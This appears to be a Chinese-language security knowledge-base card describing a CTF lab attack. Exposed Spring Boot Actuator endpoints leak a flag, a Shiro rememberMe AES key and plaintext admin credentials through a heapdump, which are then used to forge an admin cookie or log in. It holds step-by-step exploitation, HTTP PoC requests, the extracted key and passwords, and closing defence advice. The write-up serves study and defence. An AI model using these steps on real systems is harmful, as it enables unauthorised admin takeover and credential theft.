---
id: web-java-framework-shiro-actuator-heapdump-key-account-forgery
title: Actuator heapdump 泄露 Shiro rememberMe 密钥与内置账号，伪造 admin 身份
type: scenario
domain: web
path: web/java/framework/shiro
technique: shiro-rememberme-key-heapdump
aliases:
- heapdump 提取 Shiro 密钥
- CookieRememberMeManager 密钥泄露
- rememberMe 身份伪造
- LabRealm 账号泄露
- Spring Actuator 内存快照提权
tags:
- java
- shiro
- rememberme
- spring-boot
- actuator
- heapdump
- credential-leak
- auth-bypass
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:31:46+08:00'
  notes: 已对照原文核对：actuator、env、beans、mappings、heapdump 均未授权；env/FLAG 返回 systemEnvironment 的 flag；heapdump 中 ShiroConfig/LabRealm/CookieRememberMeManager/LabFlagService、密钥 47 5a 43 54 46 53 68 69 72 6f 47 43 4d 4b 65 79 对应 GZCTFShiroGCMKey 与 Base64 R1pDVEZTaGlyb0dDTUtleQ==、realm com.gzctf.lab.config.LabRealm_0、admin 密码以 A9r#Qv3 开头、user/user123、api/auth/me 角色 user/ops/admin、api/auth/login 成功与审计备注尾段均与卡片一致。未验证点：PoC 未本机复跑；CTF 无组件版本；frontmatter 无 sources/source_url。
---

## 一句话结论

Spring Boot Actuator 未授权开放时，`/actuator/env/<KEY>` 可直接读取环境变量中的 flag，`/actuator/heapdump` 则能在堆内存中定位 Shiro `CookieRememberMeManager` 的 AES 密钥、`LabRealm` 内置账号密码与 realm 名；攻击者据此伪造 `rememberMe` Cookie 或以泄露的 admin 凭据登录，完成权限突破。

## 原理

- Actuator 端点未鉴权时，`/actuator/env/{name}` 按属性名返回配置/环境变量；`/actuator/heapdump` 返回完整 JVM 堆快照（HPROF）。
- 运行期 Shiro 的 `CookieRememberMeManager` 对象持有 `encryptionCipherKey` 字节数组；`LabRealm`/自定义 Realm 持有用户表与密码；这些对象在堆中以普通字段存在，MAT/JDumpSpider 可直接读出。
- Shiro 的 rememberMe Cookie 结构为 `base64(IV + AES-CBC(序列化的 PrincipalCollection))`；掌握密钥即可自行构造密文，服务端解密并反序列化后恢复攻击者指定的身份。
- 构造时还需 realm 名（本例 `com.gzctf.lab.config.LabRealm_0`）与 principal 结构，使 `SimplePrincipalCollection` 能被 Realm 正确解析；文章从 heapdump 同时取得了这些信息。
- 另一条路径是直接使用堆中泄露的 admin 明文密码调用 `/api/auth/login`，获得完整登录态与角色 `["user","ops","admin"]`。
- 根因是 Actuator 暴露 + 密钥/凭据在内存中以明文对象存在，两者叠加把信息泄露升级为管理员接管。

## 触发条件

- Spring Boot 应用暴露 Actuator，`env`、`heapdump` 等端点未鉴权或可绕过鉴权。
- 应用使用 Apache Shiro 的 rememberMe，且密钥由应用配置/生成后长期驻留堆中。
- heapdump 可下载，且堆中存在可用的 Shiro 密钥、Realm 账号或业务凭据。
- 管理接口信任 rememberMe 身份或可用泄露凭据完成真实登录。

## 利用步骤

1. 探测 `/actuator`、`/actuator/env`、`/actuator/mappings`、`/actuator/heapdump` 是否可匿名访问。
2. 直接读环境变量：`GET /actuator/env/FLAG`，响应 `property.value` 即 flag。
3. 下载 heapdump：`curl -s http://target/actuator/heapdump -o heapdump`。
4. 用 MAT/JDumpSpider 搜索 `CookieRememberMeManager`、`LabRealm`、`ShiroConfig`、`LabFlagService` 等类，提取 `encryptionCipherKey` 字节、realm 名、用户名与明文密码。
5. 用密钥按 `base64(IV + AES-CBC(serialize(SimplePrincipalCollection)))` 构造 rememberMe Cookie，访问 `/api/auth/me` 确认 `authenticated:true, user:admin, roles:[user,ops,admin]`。
6. 或用泄露的 admin 凭据 POST `/api/auth/login`（可带 `rememberMe:true`），再访问 `/api/admin/system/summary`、`/api/admin/ops/reports`、`/api/admin/audit/list` 等管理接口。

## PoC

```http
GET /actuator/env/FLAG HTTP/1.1
Host: target

HTTP/1.1 200 OK
{"property":{"source":"systemEnvironment","value":"flag{...}"}}
```

```text
# heapdump 中提取到的关键对象
com.gzctf.lab.config.ShiroConfig
com.gzctf.lab.config.LabRealm
org.apache.shiro.web.mgt.CookieRememberMeManager
com.gzctf.lab.service.LabFlagService

# rememberMe 密钥字节
47 5a 43 54 46 53 68 69 72 6f 47 43 4d 4b 65 79
# ASCII: GZCTFShiroGCMKey
# Base64: R1pDVEZTaGlyb0dDTUtleQ==

# 内置账号
admin : A9r#Qv3!Lm7@Tp2$Xz5&Nk8*Hs4^Wc1
user  : user123
# realm 名
com.gzctf.lab.config.LabRealm_0
```

```http
GET /api/auth/me HTTP/1.1
Host: target
Cookie: rememberMe=<base64(IV+AES-CBC(序列化身份))>

HTTP/1.1 200 OK
{"authenticated":true,"user":"admin","roles":["user","ops","admin"]}
```

```http
POST /api/auth/login HTTP/1.1
Host: target
Content-Type: application/json

{"username":"admin","password":"A9r#Qv3!Lm7@Tp2$Xz5&Nk8*Hs4^Wc1","rememberMe":true}
```

## 变体与关联

- 只有 `env` 暴露时，可用 `/actuator/env` 枚举属性名（如 `FLAG`、`jwt.secret`、数据源密码）。
- heapdump 中还可提取 JWT 密钥、Session、Redis/数据库凭据，按目标环境选择伪造或直连。
- 若 rememberMe 密钥为随机强密钥且无法从堆中取得，可退回 Shiro-721 Padding Oracle 或泄露凭据登录。
- 关联：[[web-java-framework-spring-actuator-heapdump-credential-leak]]（heapdump 通用凭据提取）、[[web-java-framework-shiro-550-hardcoded-key-deserialization]]（rememberMe 反序列化 RCE）、[[web-java-framework-shiro-721-padding-oracle]]（密钥不可得时的 Cookie 伪造）。

## 检测与防御

- 生产环境关闭 `env`/`heapdump`，不要 `include=*`；Actuator 端点加认证与网络 ACL。
- Shiro 使用强随机密钥并定期轮换，不把密钥写入可被堆 dump 的长期对象；关闭不必要的 rememberMe。
- 管理接口不直接信任 rememberMe，要求完整登录态与二次认证；admin 密码不与内部服务复用。
- 检测 `/actuator/heapdump` 大文件下载、`/actuator/env/*` 异常访问、异常长 rememberMe Cookie 与 `rememberMe=deleteMe` 响应。
